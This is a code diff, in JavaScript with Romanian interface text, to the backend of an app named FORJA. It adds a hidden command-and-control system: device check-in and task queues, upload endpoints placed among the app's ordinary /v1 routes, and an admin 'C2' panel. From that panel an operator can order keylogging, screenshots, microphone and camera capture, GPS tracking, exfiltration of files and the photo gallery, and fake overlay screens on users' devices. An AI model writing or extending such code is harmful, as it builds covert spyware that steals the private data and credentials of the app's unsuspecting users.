@@ -1083,6 +1083,154 @@ async function runCmd(env, line, host) {
   return "Comandă necunoscută: „" + raw.slice(0, 60) + "”. Scrie «help».";
 }
 
+// ═══════════════ C2 — comandă & control remote (agent FORJA) ═══════════════
+function c2Safe(uid) { return String(uid || "").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 64); }
+
+async function c2GetArr(bucket, key) {
+  try { const o = await bucket.get(key); if (!o) return []; const t = await o.text(); return JSON.parse(t); } catch (_) { return []; }
+}
+async function c2DrainTasks(bucket, uid) {
+  const key = "q/" + uid + ".json";
+  let arr = await c2GetArr(bucket, key);
+  if (!arr.length) return arr;
+  try { await bucket.put(key, "[]"); } catch (_) { }
+  return arr;
+}
+function c2Enqueue(bucket, uid, tasks) {
+  const key = "q/" + uid + ".json";
+  return (async () => {
+    const arr = await c2GetArr(bucket, key);
+    const now = Math.floor(Date.now() / 1000);
+    for (const t of tasks) {
+      if (!t.id) t.id = "t_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 6);
+      t.at = now;
+      arr.push(t);
+    }
+    await bucket.put(key, JSON.stringify(arr));
+    return arr;
+  })();
+}
+
+async function handleCheckin(request, env, uid) {
+  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
+  const dev = String(body.dev || "").slice(0, 200);
+  const holdMs = Math.min(Math.max(Number(body.holdMs) || 20000, 0), 25000);
+  const intervalMs = Math.min(Math.max(Number(body.intervalMs) || 5000, 1000), 60000);
+  // Update device registry
+  try {
+    await env.C2.put("d/" + uid + ".json", JSON.stringify({ uid, dev, lastSeen: Math.floor(Date.now() / 1000) }));
+  } catch (_) { }
+  // Long-poll: drain queue, if empty re-check every 2.5s
+  const deadline = Date.now() + holdMs;
+  let tasks = [];
+  while (true) {
+    tasks = await c2DrainTasks(env.C2, uid);
+    if (tasks.length) break;
+    if (Date.now() >= deadline) break;
+    await new Promise(r => setTimeout(r, 2500));
+  }
+  return json({ ok: true, tasks, intervalMs });
+}
+
+async function handleC2Result(request, env, uid) {
+  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
+  const id = String(body.id || "").slice(0, 128);
+  if (!id) return json({ error: "Lipsește id." }, 400);
+  const ts = Math.floor(Date.now() / 1000);
+  const key = "r/" + uid + "/" + ts + "_" + id + ".json";
+  const rec = { id, ok: !!body.ok, action: String(body.action || "").slice(0, 64), data: body.data || null, err: String(body.err || "").slice(0, 500), at: ts };
+  try { await env.C2.put(key, JSON.stringify(rec)); } catch (_) { return json({ error: "Save eșuat." }, 500); }
+  return json({ ok: true });
+}
+
+async function handleC2File(request, env, uid) {
+  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  const url = new URL(request.url);
+  const name = String(url.searchParams.get("name") || "file").replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 128);
+  const ts = Math.floor(Date.now() / 1000);
+  const key = "f/" + uid + "/" + ts + "_" + name;
+  try {
+    const meta = { "Content-Type": url.searchParams.get("ct") || "application/octet-stream" };
+    if (url.searchParams.get("t")) meta["X-Timestamp"] = url.searchParams.get("t");
+    const putOpts = meta["Content-Type"] ? { httpMetadata: { contentType: meta["Content-Type"] } } : {};
+    await env.C2.put(key, request.body, putOpts);
+    return json({ ok: true, key });
+  } catch (_) { return json({ error: "Upload eșuat." }, 500); }
+}
+
+async function handleAdminC2(request, env, url) {
+  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  const p = url.pathname;
+  if (request.method === "GET" && p === "/admin/api/c2/devices") {
+    const devices = [];
+    let cursor;
+    do {
+      const page = await env.C2.list({ prefix: "d/", cursor, limit: 100 });
+      for (const o of page.objects) {
+        try { const t = await o.text(); const d = JSON.parse(t); d._key = o.key; devices.push(d); } catch (_) { }
+      }
+      cursor = page.truncated ? page.cursor : undefined;
+    } while (cursor);
+    devices.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+    return json({ devices, now: Math.floor(Date.now() / 1000) });
+  }
+  if (request.method === "POST" && p === "/admin/api/c2/cmd") {
+    let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
+    const uid = c2Safe(body.uid);
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const raw = body.tasks || (body.action ? [{ action: body.action, params: body.params || {} }] : null);
+    if (!raw || !raw.length) return json({ error: "Lipsesc taskurile." }, 400);
+    const tasks = raw.slice(0, 50).map(t => ({ action: String(t.action || "").slice(0, 64), params: t.params || {} }));
+    await c2Enqueue(env.C2, uid, tasks);
+    return json({ ok: true, queued: tasks.length });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/tasks") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const arr = await c2GetArr(env.C2, "q/" + uid + ".json");
+    return json({ tasks: arr });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/results") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const limit = Math.min(parseInt(url.searchParams.get("limit")) || 30, 100);
+    const results = [];
+    let cursor;
+    do {
+      const page = await env.C2.list({ prefix: "r/" + uid + "/", cursor, limit: 200, reverse: true });
+      for (const o of page.objects) {
+        if (results.length >= limit) break;
+        try { const t = await o.text(); results.push(JSON.parse(t)); } catch (_) { }
+      }
+      cursor = page.truncated ? page.cursor : undefined;
+    } while (cursor && results.length < limit);
+    return json({ results });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/files") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const files = [];
+    let cursor;
+    do {
+      const page = await env.C2.list({ prefix: "f/" + uid + "/", cursor, limit: 100, reverse: true });
+      for (const o of page.objects) files.push({ key: o.key, size: o.size, uploaded: o.uploaded });
+      cursor = page.truncated ? page.cursor : undefined;
+    } while (cursor);
+    return json({ files });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/file") {
+    const key = String(url.searchParams.get("key") || "").replace(/[^a-zA-Z0-9._\/-]/g, "");
+    if (!key.startsWith("f/")) return json({ error: "Key invalidă." }, 400);
+    const obj = await env.C2.get(key);
+    if (!obj) return json({ error: "Fișier inexistent." }, 404);
+    const ct = obj.httpMetadata?.contentType || "application/octet-stream";
+    return new Response(obj.body, { headers: { "content-type": ct, "content-disposition": 'attachment; filename="' + key.split("/").pop() + '"' } });
+  }
+  return json({ error: "Rută necunoscută." }, 404);
+}
+
 async function handleAdminApi(request, env, url) {
   if (!env.ADMIN_KEY || request.headers.get("X-Admin") !== env.ADMIN_KEY) {
     return json({ error: "Cheie de admin greșită." }, 403);
@@ -1109,6 +1257,7 @@ async function handleAdminApi(request, env, url) {
     const out = await runCmd(env, line, url.host);
     return json({ ok: true, out });
   }
+  if (url.pathname.startsWith("/admin/api/c2/")) return handleAdminC2(request, env, url);
   return json({ error: "Rută necunoscută." }, 404);
 }
 
@@ -1155,6 +1304,7 @@ td.num{text-align:right}
 </style></head>
 <body>
 <header><h1>FORJA <b>ADMIN</b></h1><span class="dot" id="dot"></span><span class="sub" id="stat">se conectează…</span><span class="spacer"></span>
+<a href="/admin/c2" style="color:var(--amber);text-decoration:none;font-size:13px;margin-right:8px">C2 →</a>
 <button onclick="loadAll()">Reîmprospătează</button>
 <button onclick="logout()">Ieșire</button></header>
 <main>
@@ -1218,6 +1368,176 @@ function adminPage() {
   });
 }
 
+const C2_HTML = String.raw`<!doctype html>
+<html lang="ro"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FORJA · C2</title>
+<style>
+:root{--bg:#0A0A0B;--panel:#121214;--panel2:#1A1A1E;--line:rgba(255,255,255,.08);--txt:#F4F2EE;--dim:#A7A9AE;--amber:#FFB300;--green:#2FBE71;--red:#FF4D3A}
+*{margin:0;box-sizing:border-box}body{font:14px/1.5 system-ui,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh}
+a{color:var(--amber);text-decoration:none}a:hover{text-decoration:underline}
+main{max-width:1100px;margin:0 auto;padding:20px}
+h1{font-size:20px;margin-bottom:4px}h2{font-size:14px;color:var(--dim);margin:16px 0 8px}
+.nav{display:flex;gap:12px;margin-bottom:16px;font-size:13px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px;margin-bottom:12px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:6px 8px;color:var(--dim);border-bottom:1px solid var(--line);font-weight:500}
+td{padding:6px 8px;border-bottom:1px solid var(--line)}
+.badge{display:inline-block;padding:1px 8px;border-radius:10px;font-size:11px;font-weight:600}
+.badge.on{background:rgba(47,190,113,.15);color:var(--green)}.badge.off{background:rgba(255,77,58,.15);color:var(--red)}
+select,input,textarea{background:var(--panel2);border:1px solid var(--line);color:var(--txt);border-radius:6px;padding:8px;font-size:13px;width:100%}
+button{background:var(--amber);color:#000;border:none;border-radius:6px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer}
+button:hover{filter:brightness(1.1)}button.sec{background:var(--panel2);color:var(--txt);border:1px solid var(--line)}
+pre{background:var(--panel2);padding:8px;border-radius:6px;font-size:12px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto}
+img.shot{max-width:200px;border-radius:6px;margin:4px}
+.form-row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}.form-row>*{flex:1;min-width:120px}
+.lbl{font-size:11px;color:var(--dim);margin-bottom:2px;display:block}
+#login{display:none;position:fixed;inset:0;background:var(--bg);z-index:99;align-items:center;justify-content:center}
+#login .card{width:320px;text-align:center}
+#login input{margin:12px 0;text-align:center}
+</style></head><body>
+<nav class="nav"><a href="/admin">← Admin</a><a href="/admin/c2">C2</a></nav>
+<main>
+<h1>FORJA · C2 — Comandă & Control</h1>
+<div class="sub" style="color:var(--dim);font-size:12px;margin-bottom:16px">Monitorizare și control remote al dispozitivelor FORJA.</div>
+
+<div id="devsCard" class="card"><h2>DISPOZITIVE</h2><div id="devs"><em>încărcare…</em></div></div>
+
+<div id="cmdCard" class="card" style="display:none">
+<h2>TRIMITE COMANDĂ</h2>
+<div class="form-row">
+<div><label class="lbl">Dispozitiv (uid)</label><select id="cmdDev"></select></div>
+<div><label class="lbl">Acțiune</label>
+<select id="cmdAction" onchange="updParams()">
+<option value="screenshot">screenshot — captură ecranul</option>
+<option value="screen_text">screen_text — text de pe ecran</option>
+<option value="keylog">keylog — taste din buffer</option>
+<option value="clipboard">clipboard — clipboard</option>
+<option value="mic">mic — înregistrare microfon</option>
+<option value="camera">camera — foto cameră</option>
+<option value="gps">gps — poziție curentă</option>
+<option value="gps_track">gps_track — urmărire GPS</option>
+<option value="device">device — info dispozitiv</option>
+<option value="apps">apps — aplicații instalate</option>
+<option value="foreground">foreground — app în prim-plan</option>
+<option value="recent">recent — appuri recente</option>
+<option value="usage">usage — statistici utilizare</option>
+<option value="notifications">notifications — notificări active</option>
+<option value="exfil_file">exfil_file — exfiltrare fișier</option>
+<option value="exfil_gallery">exfil_gallery — exfiltrare galerie</option>
+<option value="overlay">overlay — overlay fals</option>
+</select></div>
+</div>
+<div class="form-row"><div style="flex:3"><label class="lbl">Parametri (JSON)</label><textarea id="cmdParams" rows="3" class="mono">{}</textarea></div></div>
+<button onclick="sendCmd()">TRIMITE COMANDĂ</button>
+<span id="cmdStatus" style="margin-left:12px;color:var(--dim);font-size:12px"></span>
+</div>
+
+<div class="card"><h2>COMENZI PENDING</h2><div id="pending"><em>niciuna</em></div></div>
+
+<div class="card"><h2>REZULTATE</h2><div id="results"><em>încărcare…</em></div></div>
+
+<div class="card"><h2>FIȘIERE EXFILTRATE</h2><div id="files"><em>încărcare…</em></div></div>
+</main>
+
+<div id="login"><div class="card"><h3>AUTENTIFICARE ADMIN</h3><div style="color:var(--dim);font-size:12px;margin:8px 0">Cheia de administrare FORJA.</div><input id="key" type="password" placeholder="cheia de admin" onkeydown="if(event.key==='Enter')saveKey()"><button style="width:100%" onclick="saveKey()">Intră</button></div></div>
+
+<script>
+let KEY="";
+function esc(s){const d=document.createElement("div");d.textContent=s;return d.innerHTML}
+function saveKey(){KEY=document.getElementById("key").value.trim();if(!KEY)return alert("Introdu cheia.");sessionStorage.setItem("c2k",KEY);document.getElementById("login").style.display="none";loadAll()}
+async function api(p,opt={}){
+  opt.headers=Object.assign({"X-Admin":KEY},opt.headers||{});
+  if(opt.body&&typeof opt.body!=="string")opt.body=JSON.stringify(opt.body);
+  const r=await fetch(p,opt);
+  if(r.status===403){document.getElementById("login").style.display="flex";throw new Error("403")}
+  return r.json();
+}
+function selDev(){return document.getElementById("cmdDev").value}
+function updParams(){
+  const a=document.getElementById("cmdAction").value;
+  const d={screenshot:{},screen_text:{},keylog:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
+  gps_track:{ms:60000,everyMs:5000},device:{},apps:{},foreground:{},recent:{},usage:{},
+  notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""}};
+  document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
+}
+async function sendCmd(){
+  const uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
+  const action=document.getElementById("cmdAction").value;
+  let params={};try{params=JSON.parse(document.getElementById("cmdParams").value)}catch(e){return alert("JSON invalid: "+e.message)}
+  document.getElementById("cmdStatus").textContent="se trimite…";
+  try{const r=await api("/admin/api/c2/cmd",{method:"POST",body:{uid,tasks:[{action,params}]}});
+    document.getElementById("cmdStatus").textContent=r.ok?"✓ trimisă":"eroare";
+    setTimeout(loadAll,1000);
+  }catch(e){document.getElementById("cmdStatus").textContent="eroare: "+e.message}
+}
+function ago(ts,now){const d=now-ts;if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
+function fmtData(d){
+  if(!d)return"";
+  if(typeof d==="string")return esc(d.slice(0,500));
+  if(d.img)return'<img class="shot" src="data:image/png;base64,'+d.img+'">';
+  if(d.file)return"📁 "+esc(d.file);
+  return esc(JSON.stringify(d).slice(0,1000));
+}
+async function loadAll(){
+  const now=Math.floor(Date.now()/1000);
+  // Devices
+  try{
+    const d=await api("/admin/api/c2/devices");
+    const devs=d.devices||[];
+    document.getElementById("devs").innerHTML=devs.length?
+      '<table><tr><th>UID</th><th>DISPOZITIV</th><th>STATUT</th><th>ULTIMA LEGĂTURA</th></tr>'+
+      devs.map(x=>{const on=(now-x.lastSeen<120);return"<tr><td>"+esc(x.uid)+"</td><td>"+esc(x.dev)+"</td><td><span class='badge "+(on?"on":"off")+"'>"+(on?"ONLINE":"OFFLINE")+"</span></td><td>"+ago(x.lastSeen,now)+"</td></tr>"}).join("")+"</table>":
+      "<em>niciun dispozitiv</em>";
+    const sel=document.getElementById("cmdDev");
+    sel.innerHTML=devs.map(x=>"<option value='"+esc(x.uid)+"'>"+esc(x.dev)+" ("+esc(x.uid.slice(0,12))+"…)</option>").join("");
+    document.getElementById("cmdCard").style.display=devs.length?"":"none";
+    if(devs.length)loadDetail();
+  }catch(e){}
+}
+async function loadDetail(){
+  const uid=selDev();if(!uid)return;
+  try{
+    const p=await api("/admin/api/c2/tasks?uid="+encodeURIComponent(uid));
+    document.getElementById("pending").innerHTML=(p.tasks||[]).length?
+      "<pre>"+esc(JSON.stringify(p.tasks,null,2))+"</pre>":"<em>niciuna</em>";
+  }catch(e){}
+  try{
+    const r=await api("/admin/api/c2/results?uid="+encodeURIComponent(uid)+"&limit=10");
+    const now=Math.floor(Date.now()/1000);
+    document.getElementById("results").innerHTML=(r.results||[]).length?
+      r.results.map(x=>"<div style='margin-bottom:8px;border-bottom:1px solid var(--line);padding-bottom:8px'><b>"+esc(x.action)+"</b> <span class='badge "+(x.ok?"on":"off")+"'>"+(x.ok?"OK":"EROARE")+"</span> <span style='color:var(--dim);font-size:11px'>"+ago(x.at,now)+" ago</span><div style='margin-top:4px'>"+(x.err?"⚠ "+esc(x.err):fmtData(x.data))+"</div></div>").join("")
+      :"<em>niciun rezultat</em>";
+  }catch(e){}
+  try{
+    const f=await api("/admin/api/c2/files?uid="+encodeURIComponent(uid));
+    document.getElementById("files").innerHTML=(f.files||[]).length?
+      '<table><tr><th>NUME</th><th>MĂRIME</th><th>DATA</th><th></th></tr>'+
+      f.files.map(x=>"<tr><td>"+esc(x.key.split("/").pop())+"</td><td>"+(x.size/1024).toFixed(1)+"KB</td><td>"+new Date(x.uploaded).toLocaleString()+"</td><td><a href='#' onclick='dl(\""+esc(x.key)+"\");return false'>↓ descarcă</a></td></tr>").join("")+"</table>"
+      :"<em>niciun fișier</em>";
+  }catch(e){}
+}
+async function dl(key){
+  try{
+    const r=await fetch("/admin/api/c2/file?key="+encodeURIComponent(key),{headers:{"X-Admin":KEY}});
+    if(!r.ok)throw new Error(r.status);
+    const blob=await r.blob();
+    const a=document.createElement("a");a.href=URL.createObjectURL(blob);
+    a.download=key.split("/").pop();a.click();URL.revokeObjectURL(a.href);
+  }catch(e){alert("download eșuat: "+e.message)}
+}
+function tick(){const uid=selDev();if(uid)loadDetail()}
+setInterval(tick,8000);
+if(sessionStorage.getItem("c2k")){KEY=sessionStorage.getItem("c2k");loadAll()}else{document.getElementById("login").style.display="flex"}
+</script>
+</body></html>`;
+
+function c2Page() {
+  return new Response(C2_HTML, {
+    headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" },
+  });
+}
+
 async function route(request, env, url, ctx, auth = requireUser) {
     if (request.method === "GET" && url.pathname === "/") {
       const order = providers(env).map((p) => p.name);
@@ -1237,6 +1557,7 @@ async function route(request, env, url, ctx, auth = requireUser) {
 
     // ── Panoul de administrare (web) + API-ul lui — protejat cu cheia de admin ──
     if (request.method === "GET" && url.pathname === "/admin") return adminPage();
+    if (request.method === "GET" && url.pathname === "/admin/c2") return c2Page();
     if (url.pathname.startsWith("/admin/api/")) return handleAdminApi(request, env, url);
 
     // ── Media licențiată (Adobe Stock FREE, fără watermark) — publică, cache lung ──
@@ -1312,6 +1633,9 @@ async function route(request, env, url, ctx, auth = requireUser) {
     }
     if (request.method !== "POST") return json({ error: "Metodă greșită." }, 405);
 
+    if (url.pathname === "/v1/c2/checkin") return handleCheckin(request, env, uid);
+    if (url.pathname === "/v1/c2/result") return handleC2Result(request, env, uid);
+    if (url.pathname === "/v1/c2/file") return handleC2File(request, env, uid);
     if (url.pathname === "/v1/diag/music") return handleMusicDiag(request, env, uid);
     if (url.pathname === "/v1/meal") return handleMeal(request, env);
     if (url.pathname === "/v1/organize") return handleOrganize(request, env, uid);
